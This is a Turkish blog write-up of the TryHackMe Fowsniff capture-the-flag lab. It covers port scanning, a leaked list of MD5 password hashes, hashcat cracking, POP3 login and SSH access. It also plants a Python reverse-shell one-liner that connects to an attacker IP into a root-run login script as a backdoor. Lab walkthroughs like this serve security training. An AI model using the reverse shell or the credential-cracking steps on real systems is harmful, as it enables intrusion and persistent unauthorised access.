@@ -1,0 +1,52 @@
+<!doctype html><html lang=en><head><title>TryHackme | Fowsniff CTF Write-Up :: 0xdak</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Bu içerik TryHackMe platformundaki Fowsniff CTF’inin çözümünü içerir. Çözmek isteyenler için: https://tryhackme.com/room/ctf
+Port enumeration:
+nmap -vv -A -p- -sV -o nmap_output 10.10.218.240
+nmap sonucunda
+ 22 ssh 80 http 110 pop3 143 imap  portlarının açık olduğunu görüyorum.
+Hedef makine web site yayını yapıyor. Giriyorum ama kayda değer bir şey bulamıyorum.
+dirb ile siteyi tarıyorum.
+/security.txt’ye giriyorum.
+Verilen ipucundan şirket çalışanlarının emaillerinin ve hashlerinin sızdırıldığı bilgilerin pastebin’de olduğunu görüyorum.
+FOWSNIFF CORP PASSWORD LEAK &amp;#39;&amp;#39;~`` ( o o ) +-----."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=/posts/fowsniff-ctf-write-up-a1924688797e455cbc2b1b402aa266c6/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/assets/pink.css><link rel=apple-touch-icon href=/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="TryHackme | Fowsniff CTF Write-Up"><meta property="og:description" content="Bu içerik TryHackMe platformundaki Fowsniff CTF’inin çözümünü içerir. Çözmek isteyenler için: https://tryhackme.com/room/ctf
+Port enumeration:
+nmap -vv -A -p- -sV -o nmap_output 10.10.218.240
+nmap sonucunda
+ 22 ssh 80 http 110 pop3 143 imap  portlarının açık olduğunu görüyorum.
+Hedef makine web site yayını yapıyor. Giriyorum ama kayda değer bir şey bulamıyorum.
+dirb ile siteyi tarıyorum.
+/security.txt’ye giriyorum.
+Verilen ipucundan şirket çalışanlarının emaillerinin ve hashlerinin sızdırıldığı bilgilerin pastebin’de olduğunu görüyorum.
+FOWSNIFF CORP PASSWORD LEAK &amp;#39;&amp;#39;~`` ( o o ) +-----."><meta property="og:url" content="/posts/fowsniff-ctf-write-up-a1924688797e455cbc2b1b402aa266c6/"><meta property="og:site_name" content="0xdak"><meta property="og:image" content="/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-05-06 00:09:00 +0300 +0300"></head><body class=pink><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>0xdak</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/>Blog</a></li><li><a href=/about>Hakkımda</a></li><li><a href=/terms>Terimler</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/>Blog</a></li><li><a href=/about>Hakkımda</a></li><li><a href=/terms>Terimler</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=/posts/fowsniff-ctf-write-up-a1924688797e455cbc2b1b402aa266c6/>TryHackme | Fowsniff CTF Write-Up</a></h1><div class=post-meta><span class=post-date>2022-05-06</span></div><div class=post-content><div><p>Bu içerik TryHackMe platformundaki Fowsniff CTF’inin çözümünü içerir. Çözmek isteyenler için: <a href=https://tryhackme.com/room/ctf>https://tryhackme.com/room/ctf</a></p><p>Port enumeration:</p><p><code>nmap -vv -A -p- -sV -o nmap_output 10.10.218.240</code></p><p>nmap sonucunda</p><ul><li>22 ssh</li><li>80 http</li><li>110 pop3</li><li>143 imap</li></ul><p>portlarının açık olduğunu görüyorum.</p><p>Hedef makine web site yayını yapıyor. Giriyorum ama kayda değer bir şey bulamıyorum.</p><p>dirb ile siteyi tarıyorum.</p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled.png alt=Untitled></p><p>/security.txt’ye giriyorum.</p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%201.png alt=Untitled></p><p>Verilen ipucundan şirket çalışanlarının emaillerinin ve hashlerinin sızdırıldığı bilgilerin pastebin’de olduğunu görüyorum.</p><pre tabindex=0><code>FOWSNIFF CORP PASSWORD LEAK
+                &#39;&#39;~``
+               ( o o )
+    +-----.oooO--(_)--Oooo.------+
+    |                            |
+    |          FOWSNIFF          |
+    |            got             |
+    |           PWN3D!!!         |
+    |                            |
+    |       .oooO                |
+    |        (   )   Oooo.       |
+    +---------\ (----(   )-------+
+               \_)    ) /
+                     (_/
+    FowSniff Corp got pwn3d by B1gN1nj4!
+    No one is safe from my 1337 skillz!
+mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7eFowsniff 
+Corporation Passwords LEAKED!
+FOWSNIFF CORP PASSWORD DUMP!
+Here are their email passwords dumped from their databases.
+They left their pop3 server WIDE OPEN, too!MD5 is insecure, so you shouldn&#39;t have trouble cracking them but I was too lazy haha =Pl8r n00bz!B1gN1nj4
+</code></pre><p>Hash tipinin MD5 olduğunu biliyorum ve buna göre hashcat ile bruteforce yaparak seina’nın parolasını kırmaya çalışıyorum.</p><p><code>hashcat -a 0 -m 0 "90dc16d47114aa13671c697fd506cf26" /usr/share/wordlists/rockyou.txt -vv</code></p><ul><li>-a 0 —> attack türümüzün dictionary attack olduğunu belirtir.</li><li>-m 0 —> kırılacak hash tipinin MD5 olduğunu belirtir.</li></ul><p>Bu komut sonrası parolamız kırıldı.</p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%202.png alt=Untitled></p><p>Elimdeki user ve pass bilgileriyle, telnet ile 110. porttan makineye bağlanıyorum ve seina’nın maillerini görüntülüyorum.</p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%203.png alt=Untitled></p><p>Seina’nın SSH için kullandığı geçiçi parolayı görüyorum.</p><p><code>S1ck3nBluff+secureshell</code></p><p>Gönderenin kullanıcı adı ve bu şifreyle ssh bağlantısı yapıyorum.</p><p><code>baksteen:S1ck3nBluff+secureshell</code></p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%204.png alt=Untitled></p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%205.png alt=Untitled></p><p>baksteen kullanıcısı users grubuna dahil. users grubunun çalıştıracağı dosyaları listelediğimde karşıma <a href=http://cube.sh>cube.sh</a> çıkıyor.</p><p><a href=http://cube.sh>cube.sh</a>’ı nano ile açtığımda bir şey dikkatimi çekiyor.</p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%206.png alt=Untitled></p><p>Bu banner ssh’a bağlandığımızda karşımıza çıkan banner. Yani buradan ssh ilk açıldığında bu dosyanın çağrıldığını anlıyorum. Bu dosyanın içeriğini reverse_shell bir betik ile değiştirerek bir root olarak çalışacak backdoor oluşturabilirim.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#960050;background-color:#1e0010>&#39;</span>import socket,subprocess,os;s<span style=color:#f92672>=</span>socket.socket<span style=color:#f92672>(</span>socket.AF_INET,socket.SOCK_STREAM<span style=color:#f92672>)</span>;s.connect<span style=color:#f92672>((</span>&lt;IP&gt;,1234<span style=color:#f92672>))</span>;os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,0<span style=color:#f92672>)</span>; os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,1<span style=color:#f92672>)</span>; os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,2<span style=color:#f92672>)</span>;p<span style=color:#f92672>=</span>subprocess.call<span style=color:#f92672>([</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span>,<span style=color:#e6db74>&#34;-i&#34;</span><span style=color:#f92672>])</span>;’
+</span></span></code></pre></div><p><a href=http://cube.sh>cube.sh</a> dosyasına bu satırı ekledikten sonra ssh bağlantısını kapatıyorum.</p><p>Çalışacak olan betiğin geleceği port 1234 ve 1234 portunu dinliyorum.</p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%207.png alt=Untitled></p><p>Makineye ssh ile bir kez daha bağlanıyorum ve script çalışıyor.</p><p><img src=/img/Fowsniff%20CTF%20Write-Up%20a1924688797e455cbc2b1b402aa266c6/Untitled%208.png alt=Untitled></p><p>Yazdığım içeriği okuduğunuz için teşekkür ederim. İyi çalışmalar.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Diğer yazılara göz at</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/posts/wifi-hacki-3f29b/><span class=button__text>TryHackMe | Wifi Hacking 101 Write-Up</span>
+<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=/assets/main.js></script>
+<script src=/assets/prism.js></script></div></body></html>
